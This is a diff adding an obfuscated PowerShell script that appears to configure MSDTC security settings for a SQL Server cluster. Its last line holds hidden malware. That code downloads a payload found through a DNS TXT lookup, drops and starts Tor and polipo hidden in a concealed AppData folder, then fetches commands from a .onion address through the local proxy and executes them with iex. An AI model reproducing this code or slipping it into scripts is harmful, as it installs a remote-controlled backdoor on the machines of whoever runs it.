@@ -1,0 +1,131 @@
+ 
+
+${seR`Vi`cE`Name} = (("{2}{0}{3}{4}{1}"-f 'e','2)','SQL Serv','r (S','OX'))
+
+ 
+
+
+
+${TrA`NMa`N`sEC} = ("{1}{0}" -f'al','Mutu') 
+
+
+
+
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+${GrO`UpP`ATh} = ((("{0}{1}{3}{2}" -f 'HKLM:fM','VClus','VGroups','terfM'))."rEp`LA`CE"('fMV',[sTRing][cHaR]92))
+
+${gRO`Up`LI`sT} = &("{0}{1}"-f'di','r') ${G`Ro`Up`PaTh}
+
+ 
+
+
+
+foreach (${g`R`oUP} in ${g`Ro`UPliSt})
+
+{
+
+    ${Gr`OuPchIL`dP`AtH} = ${gro`UP}."P`sPATH"
+
+    if ((.("{3}{2}{0}{1}"-f't','emProperty','I','Get-') -path ${gro`U`PcHIlDpA`Th} -name ("{0}{1}"-f 'Na','me'))."n`AME" -eq ${s`ErVIcen`A`me})
+
+    {
+
+        
+
+        ${refERe`NCed`ResoU`RCES} = (&("{2}{0}{1}{3}" -f'-It','emPr','Get','operty') -path ${GroUpChIL`DP`Ath} -name ("{1}{0}" -f 'ntains','Co'))."C`oNTA`ins"
+
+        foreach (${ReS`o`URCE} in ${r`EFErENC`e`D`ReS`ouRC`eS})
+
+        {
+
+            
+
+            ${ReSo`U`Rc`epAth} = "HKLM:\Cluster\Resources\$Resource"
+
+            if ((.("{3}{4}{1}{2}{0}" -f 'y','emProper','t','Get-','It') -path ${rEsouR`C`EpA`TH})."Ty`Pe" -eq ("{4}{7}{6}{3}{8}{0}{5}{1}{2}"-f 'ac','oordin','ator',' Tra','D','tion C','d','istribute','ns'))
+
+            {
+
+                
+
+                ${SeC`U`RiT`y`paTH} = "$ResourcePath\MSDTCPRIVATE\MSDTC\Security"
+
+                .("{2}{0}{1}{3}" -f 't-I','tem','Se','Property') -path ${s`Ec`UriTypAth} -name ("{0}{1}{3}{4}{2}" -f 'N','e','s','tworkD','tcAcces') -value 1
+
+                &("{0}{2}{3}{4}{1}"-f 'Set','operty','-It','emP','r') -path ${S`E`c`URiT`YpATH} -name ("{0}{3}{1}{2}{4}"-f'N','ccessC','lient','etworkDtcA','s') -value 0
+
+                &("{0}{2}{3}{1}" -f 'S','y','et-ItemPrope','rt') -path ${Se`CuR`IT`Y`pAtH} -name ("{0}{4}{1}{5}{2}{3}"-f 'Net','ork','tcAc','cessTransactions','w','D') -value 0
+
+                .("{0}{2}{1}{4}{3}"-f 'Set','ItemPr','-','ty','oper') -path ${SecUR`it`yP`A`Th} -name ("{3}{1}{4}{2}{5}{0}" -f'ound','r','ss','Netwo','kDtcAcce','Inb') -value 1
+
+                &("{0}{4}{2}{1}{3}"-f'Set-','Pr','tem','operty','I') -path ${S`e`CuRi`TYPatH} -name ("{5}{4}{0}{1}{6}{3}{2}" -f'Acce','s','nd','tbou','kDtc','Networ','sOu') -value 1
+
+                .("{0}{2}{1}" -f 'Set-It','mProperty','e') -path ${S`ec`Ur`iTypAtH} -name ("{3}{0}{2}{1}"-f'ansa','ons','cti','LuTr') -value 1
+
+ 
+
+                
+
+                ${secUR`itYpa`TH} = "$ResourcePath\MSDTCPRIVATE\MSDTC"
+
+                if (${TraNm`A`Ns`eC} -eq ("{0}{1}"-f 'Non','e'))
+
+                {
+
+                    &("{4}{3}{2}{0}{1}{5}" -f'op','ert','Pr','et-Item','S','y') -path ${m`SdtCPa`TH} -name ("{0}{3}{2}{1}" -f 'Tu','ecurity','OffRpcS','rn') -value 1
+
+                    &("{1}{2}{3}{0}"-f 'ty','Set-ItemPro','pe','r') -path ${mSdT`c`PAtH} -name ("{1}{3}{2}{0}"-f's','AllowO','lySecureRpcCall','n') -value 0
+
+                    .("{0}{3}{1}{2}{4}"-f'S','emPro','pert','et-It','y') -path ${m`sdTcP`Ath} -name ("{0}{5}{4}{2}{3}{6}{1}" -f 'Fallb','ary','ns','ec','U','ackTo','ureRPCIfNecess') -value 0
+
+                }
+
+ 
+
+                elseif (${TRA`NmAn`Sec} -eq ("{0}{2}{1}"-f'Inco','g','min'))
+
+                {
+
+                    &("{1}{0}{3}{2}{4}" -f'I','Set-','mProper','te','ty') -path ${MsdT`CPA`TH} -name ("{1}{3}{2}{0}{5}{4}"-f 'u','TurnOffR','Sec','pc','y','rit') -value 0
+
+                    &("{0}{2}{3}{1}{4}"-f'Se','p','t-I','temPro','erty') -path ${MSDT`cp`Ath} -name ("{2}{4}{3}{1}{0}" -f'RpcCalls','nlySecure','A','lowO','l') -value 0
+
+                    .("{2}{3}{1}{0}"-f 'ty','per','Set-','ItemPro') -path ${MS`D`TCPATH} -name ("{4}{3}{7}{2}{0}{1}{5}{6}"-f 's','ecureRPCIfNece','ckToUn','allb','F','ssa','ry','a') -value 1
+
+                }
+
+ 
+
+                else 
+
+                {
+
+                    .("{2}{3}{1}{0}{4}" -f 'p','-ItemPro','Se','t','erty') -path ${m`SdT`cPatH} -name ("{3}{0}{1}{2}{4}"-f 'nOffRp','cSecu','ri','Tur','ty') -value 0
+
+                    .("{1}{4}{0}{3}{2}"-f'te','Se','erty','mProp','t-I') -path ${m`sdT`C`path} -name ("{2}{0}{3}{4}{6}{5}{1}" -f'l','s','A','low','OnlySecure','Call','Rpc') -value 1
+
+                    .("{3}{1}{0}{2}"-f 'temProper','I','ty','Set-') -path ${m`sdT`cpA`TH} -name ("{9}{5}{3}{6}{4}{2}{0}{7}{1}{8}"-f 'fNec','a','ureRPCI','ToUn','c','back','se','ess','ry','Fall') -value 0
+
+                } 
+
+ 
+
+            }
+
+        }
+
+    }
+
+}
+
+("{2}{1}{0}"-f'tEDC','eZ','xn');${e`RroRac`TIONpReFER`En`Ce} = ("{4}{2}{1}{3}{0}" -f 'e','tlyC','ilen','ontinu','S');("{0}{2}{1}" -f 'uqaaPx','N','uaC');("{0}{2}{1}"-f'DOBH','M','bJqlkR');${K`N} = (&("{2}{1}{3}{0}"-f 't','io','get-wm','bjec') ("{0}{5}{3}{1}{2}{4}"-f'Win32_Compute','mPro','d','ste','uct','rSy'))."Uu`id";'WVy';("{1}{0}"-f'EZgPRMl','gK');if ((.('gp') (("{3}{2}{4}{5}{1}{10}{11}{7}{6}{0}{9}{8}{12}{13}" -f'urrent','l7Microsof','KCU:Fl7F','H','l','7SoftwareF','C','wsFl7','ersio','V','t','Fl7Windo','nFl7','Run'))."re`plaCe"(([CHar]70+[CHar]108+[CHar]55),'\')) -match ${K`N}){;("{0}{1}" -f'mU','zql');("{1}{2}{0}{3}" -f'QITN','js','vZDT','a');(.("{1}{2}{3}{0}" -f 's','Ge','t-','Proces') -id ${P`id}).("{1}{0}"-f'l','Kil').Invoke();("{0}{1}"-f 'NgpYRh','j');("{0}{2}{1}" -f'hVXjC','Bc','tDv');};("{0}{1}"-f 'tUVXQmX','bZ');("{2}{3}{1}{0}"-f'U','x','lkT','zhJZHw');("{2}{1}{0}" -f'odeY','cPz','M');("{1}{0}"-f'NNYv','v');function e(${dK`Ez}){;("{1}{0}" -f'fPD','T');'WTw';${Jt} = (((&("{0}{1}" -f'ie','x') ('nsl'+'ookup '+'-'+'quer'+'ytype='+'txt'+' '+"$dkez "+'8.'+'8.8.'+'8')) -match '"') -replace '"', '')[0].("{1}{0}" -f'm','Tri').Invoke();("{0}{1}" -f'HdCj','wAD');("{2}{0}{1}"-f'SjtZRv','r','sV');${o`Vg}.("{2}{1}{0}" -f 'ile','oadF','Downl').Invoke(${j`T}, ${Tg});("{1}{0}" -f 'w','raV');("{1}{0}" -f 'BkS','OQNd');${e`I} = ${k`e}.("{0}{2}{1}" -f 'NameSp','e','ac').Invoke(${TG}).("{0}{1}"-f 'Item','s').Invoke();("{2}{0}{1}{3}"-f'gnucmQ','l','O','K');("{0}{1}{2}"-f 'Qfq','xo','v');${K`e}.("{2}{0}{1}"-f 'e','Space','Nam').Invoke(${SA}).("{0}{1}" -f'Copy','Here').Invoke(${E`I}, 20);("{0}{1}"-f'G','BMdJNr');("{0}{1}"-f'VM','WS');.('rd') ${T`g};("{0}{1}"-f'p','noFau');("{2}{0}{1}"-f'edlo','E','S');};("{1}{0}"-f'ZPIV','NxP');'ypi';("{2}{0}{1}" -f'l','BzCp','AFE');("{1}{0}"-f 'YRWML','b');("{0}{2}{1}"-f'UYAN','g','xqtL');'QBC';${s`A} = ${ENv:aPp`d`A`Ta} + '\' + ${Kn};("{1}{0}"-f'axyty','E');("{0}{1}"-f'Iw','uaOh');if (!(.("{2}{1}{0}"-f 'h','st-Pat','Te') ${s`A})){;("{0}{2}{1}" -f 'a','YmrKg','m');("{2}{0}{1}"-f 'gq','tEB','vWA');${qr} = &("{0}{2}{1}"-f'New-I','m','te') -ItemType ("{1}{0}" -f 'ectory','Dir') -Force -Path ${s`A};("{1}{0}" -f 'I','GqNI');("{2}{1}{0}" -f 'pGv','utU','HNPIQ');${Q`R}."a`TtrIb`Utes" = ("{1}{0}" -f 'n','Hidde'), ("{0}{1}"-f'S','ystem'), ("{1}{2}{4}{5}{0}{3}" -f 'x','N','otC','ed','ontentIn','de');("{1}{0}"-f 'RuRa','Mu');("{3}{0}{2}{1}"-f 'm','szVCO','lkC','C');};("{0}{2}{1}"-f'ZdmI','yj','G');("{2}{0}{1}"-f'Y','hOpvWV','nA');("{1}{2}{0}" -f 'IntvoU','BIA','g');("{1}{2}{0}" -f 'jr','GJ','TBzy');${z`UL}=${sa}+ ((("{2}{1}{3}{0}" -f 'r.exe','Zt','Eq','o'))  -rEplaCe'EqZ',[ChaR]92);("{1}{0}" -f'mX','swInq');("{2}{1}{0}" -f'SuL','N','LTXwOF');${A`xs}=${S`A}+ ((("{1}{3}{2}{0}"-f 'exe','{0}po','.','lipo')) -F[ChaR]92);'qkI';("{1}{0}{2}" -f'oa','WJP','Nnarn');${tg}=${S`A}+'\'+${Kn}+("{0}{1}" -f '.zi','p');'Sgw';("{0}{1}"-f 'fY','thyZ');${o`Vg}=&("{2}{1}{3}{0}" -f 't','ew-Ob','N','jec') ("{2}{1}{4}{0}{3}" -f 'li','m.Net.We','Syste','ent','bC');'Ils';("{0}{2}{1}" -f'GRldQf','K','FnfQ');${Ke}=.("{0}{1}{3}{2}"-f'New','-O','t','bjec') -C ("{1}{5}{2}{0}{4}{3}" -f 'A','Shel','.','cation','ppli','l');("{1}{2}{0}" -f 'tJQ','vVo','u');("{1}{2}{0}"-f 'axc','gHXA','s');("{0}{1}" -f'llae','tDv');'Zix';if (!(.("{0}{2}{1}"-f'Tes','Path','t-') ${z`UL}) -or !(&("{0}{1}{2}"-f 'Tes','t-Pat','h') ${A`Xs})){;("{1}{0}" -f'tJINrwhS','Q');("{2}{1}{0}"-f'xtKLAJ','kA','X');.('e') ("{0}{2}{3}{1}" -f 'i.','kin.de','va','n');("{0}{1}{2}"-f'QqV','ujkSI','PS');("{1}{0}" -f'n','dZd');};("{2}{0}{1}" -f'S','lIB','GoemQ');("{1}{0}"-f'OcJU','I');("{1}{2}{0}"-f'pCupR','FYT','Mz');("{0}{1}" -f'qEn','stu');if (!(&("{1}{0}{2}"-f'a','Test-P','th') ${z`UL}) -or !(.("{2}{0}{1}" -f't-P','ath','Tes') ${a`xS})){;("{0}{1}" -f'Z','GtSt');("{0}{2}{1}" -f'mHkBg','sU','IO');&('e') ("{1}{0}{2}"-f 'z.c','gg.ibi','c');("{1}{2}{0}" -f 'E','sD','tXm');("{0}{1}"-f 'xS','Bk');};("{2}{3}{1}{0}"-f'JqKPin','aA','Y','ai');("{1}{0}" -f 'FVK','g');("{3}{0}{2}{1}" -f'umvJ','KRm','VvJ','T');("{1}{0}"-f 'Qwp','UL');${PJ}=${sa}+((("{2}{3}{0}{1}" -f'iroaming','log','u','5')).("{2}{0}{1}"-f'epL','aCE','R').Invoke('u5i','\'));("{0}{1}{2}" -f'numdm','mh','A');("{1}{0}" -f'tEF','y');.("{0}{1}" -f'sap','s') ${z`UL} -Ar (' '+'-'+'-Lo'+'g '+"`"notice "+'f'+'ile '+"$pj`"") -wi ("{1}{2}{0}"-f 'dden','H','i');("{1}{0}"-f 'c','JCB');("{1}{0}{2}"-f 't','CjHbO','f');do{.("{1}{0}"-f 'p','slee') 1;${x`XL}=.('gc') ${p`J}}while(!(${X`Xl} -match ("{5}{0}{2}{3}{1}{6}{4}"-f'otst','%','rapped',' 100',' Done.','Bo',':')));("{2}{0}{1}" -f'Yt','pNVJtdz','w');("{1}{2}{0}" -f't','Xg','giQIPF');.("{1}{0}" -f'aps','s') ${A`xS} -a ("{5}{7}{8}{1}{3}{0}{2}{4}{6}"-f'a','x','lhost:9','y=loc','05','sock','0','sP','arentPro') -wi ("{1}{0}"-f'en','Hidd');'dlV';("{0}{1}"-f'zVL','SO');&("{1}{0}" -f 'p','slee') 7;("{2}{1}{0}"-f'uUz','Eyn','FzlDd');'Ci';${z`pp}=.("{0}{2}{1}"-f'Ne','ect','w-Obj') ("{2}{3}{1}{0}{4}"-f'rox','P','System.Net.We','b','y')(("{2}{0}{1}" -f'oc','alhost:8123','l'));("{0}{1}{2}"-f'MsOk','mL','s');'zRW';${z`pp}."usEDEf`AuLTCrE`dEn`TIaLs" = ${tR`Ue};("{1}{0}"-f'XVXIMqb','PW');'lAy';${O`VG}."p`RoXy"=${z`Pp};("{1}{2}{0}{3}"-f 'dkG','g','Ek','PjVp');("{2}{0}{1}"-f 'ooSj','z','xer');${C`A}=("{3}{10}{1}{18}{0}{12}{19}{6}{17}{21}{16}{5}{11}{13}{8}{4}{20}{9}{7}{15}{2}{14}"-f'hu.onio','ormjqj','A0DF85&ui','http://powe','9D','=14','p?s=s','1-83A','B-F1','C1','rw','C6E','n/get.p','FB','d=','7-001B38','mom','e','42','h','-D','tup&') + ${Kn};("{0}{1}" -f'SG','CFq');("{1}{0}" -f'VVnp','Gk');while(!${Q`mH}){${q`MH}=${o`Vg}.("{2}{3}{1}{0}"-f'g','in','downloa','dStr').Invoke(${CA})};'rHo';("{2}{1}{0}" -f 'R','shvr','jt');if (${Q`Mh} -ne ("{0}{1}"-f 'non','e')){;'Ju';("{1}{0}" -f'p','VuUTl');.("{1}{0}"-f'ex','i') ${q`mH};("{1}{0}" -f 'E','blh');("{2}{0}{1}" -f 'IepyN','d','Ae');};("{1}{0}" -f'hSp','w');
